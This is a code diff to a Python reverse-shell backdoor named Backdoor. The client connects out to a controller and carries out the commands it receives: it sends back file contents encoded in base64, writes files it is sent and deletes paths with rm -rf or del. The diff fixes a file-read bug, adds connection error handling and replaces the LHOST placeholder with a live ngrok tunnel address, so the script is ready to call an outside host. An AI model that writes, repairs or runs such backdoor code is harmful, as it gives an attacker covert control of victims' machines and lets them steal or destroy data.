@@ -5,9 +5,21 @@ import os
 import base64
 
 class Backdoor:
-    def __init__(self, ip, port):
+    def __init__(self, target, port):
+        self.port = port
+        self.target = target
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.connection.connect((ip, port))
+
+    def connect(self):
+        try:
+            self.connection.connect((self.target, self.port))
+            print("[+] Connected to the target.")
+        except ConnectionRefusedError:
+            print("[-] Connection refused. Make sure the server is running.")
+            exit(1)
+        except Exception as e:
+            print(f"[-] Connection failed: {e}")
+            exit(1)
 
     def reliable_send(self, data):
         json_data = json.dumps(data)
@@ -40,11 +52,12 @@ class Backdoor:
             return "[-] Directory not found: " + path
 
     def read_file(self, path):
-        if os.path.isfile():
+        if os.path.isfile(path):
             with open(path, "rb") as f:
                 return base64.b64encode(f.read()).decode()
         else:
-            return (f"[-] {path} not found")
+            return f"[-] {path} not found"
+
     def write_file(self, path, content):
         with open(path, "wb") as file:
             file.write(base64.b64decode(content))
@@ -53,11 +66,12 @@ class Backdoor:
     def remove(self, path):
         if os.path.exists(path):
             os.system(f'del -Force {path}' if os.name == 'nt' else f'rm -rf {path}')
-            return(f"[+] {path} deleted")
+            return f"[+] {path} deleted"
         else:
-            return(f"[-] {path} not found")
+            return f"[-] {path} not found"
 
     def run(self):
+        self.connect()
         while True:
             command = str(self.reliable_receive())
             command = command.split()
@@ -84,5 +98,6 @@ class Backdoor:
             print(command_result)
             self.reliable_send(command_result)
 
-my_backdoor = Backdoor("LHOST", 1337)
+my_backdoor = Backdoor("0.tcp.eu.ngrok.io", 1337)
+#my_backdoor = Backdoor("LHOST", 1337)
 my_backdoor.run()
